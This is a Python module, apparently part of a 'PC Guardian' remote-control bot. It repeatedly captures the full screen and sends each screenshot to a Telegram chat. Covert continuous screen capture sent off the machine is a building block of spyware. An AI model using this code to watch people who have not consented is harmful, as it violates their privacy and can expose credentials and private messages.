"""
PC Guardian — Screen Streamer (FIXED)
Uses threading.Event for reliable stop.
Sends via bot directly — no async loop injection needed.
"""

import os
import time
import logging
import threading
import tempfile

logger = logging.getLogger("screen_stream")

SNAP_DIR = os.path.join(tempfile.gettempdir(), "pcguardian_screens")
os.makedirs(SNAP_DIR, exist_ok=True)


class ScreenStreamer:
    def __init__(self):
        self._stop_event = threading.Event()
        self._bot        = None
        self._chat_id    = None
        self._thread     = None

    def set_bot(self, bot, loop):
        self._bot  = bot
        self._loop = loop

    def start(self, chat_id: int, interval: float = 3.0, quality: int = 60):
        # Stop existing stream first
        self.stop()
        time.sleep(0.5)

        self._stop_event.clear()
        self._chat_id = chat_id
        self._interval = max(interval, 1.0)
        self._quality  = quality

        self._thread = threading.Thread(
            target=self._run,
            args=(chat_id, self._interval, quality),
            daemon=True,
            name="ScreenStream"
        )
        self._thread.start()
        logger.info(f"Screen stream started — {interval}s interval")

    def stop(self):
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)
        self._thread = None
        logger.info("Screen stream stopped.")

    def capture_one(self, quality: int = 60) -> str:
        try:
            from PIL import ImageGrab, Image
            img  = ImageGrab.grab()
            w, h = img.size
            img  = img.resize((w // 2, h // 2), Image.LANCZOS)
            path = os.path.join(SNAP_DIR, f"ss_{int(time.time()*1000)}.jpg")
            img.save(path, "JPEG", quality=quality, optimize=True)
            return path
        except Exception as e:
            logger.error(f"Capture failed: {e}")
            return None

    def _run(self, chat_id: int, interval: float, quality: int):
        import asyncio

        while not self._stop_event.is_set():
            start = time.time()

            path = self.capture_one(quality)
            if path and self._bot and self._loop and self._loop.is_running():
                try:
                    async def _send(p=path):
                        try:
                            with open(p, "rb") as f:
                                await self._bot.send_photo(chat_id=chat_id, photo=f)
                            try: os.remove(p)
                            except: pass
                        except Exception as e:
                            logger.error(f"Send: {e}")

                    asyncio.run_coroutine_threadsafe(_send(), self._loop)
                except Exception as e:
                    logger.error(f"Schedule send: {e}")

            # Wait remaining interval or until stopped
            elapsed = time.time() - start
            self._stop_event.wait(timeout=max(0, interval - elapsed))

        logger.info("Screen stream thread exited.")


_streamer = ScreenStreamer()

def get_streamer() -> ScreenStreamer:
    return _streamer
